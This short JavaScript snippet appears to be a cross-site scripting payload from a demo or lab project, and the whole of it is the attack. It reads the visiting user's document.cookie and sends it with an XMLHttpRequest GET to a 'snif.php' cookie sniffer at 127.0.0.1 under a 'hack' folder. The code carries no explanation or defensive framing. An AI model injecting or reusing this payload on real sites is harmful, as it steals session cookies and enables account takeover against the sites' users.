var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", 'http://127.0.0.1/demo_xss_sql/hack/snif.php?cookie='+document.cookie);
xmlHttp.send(null);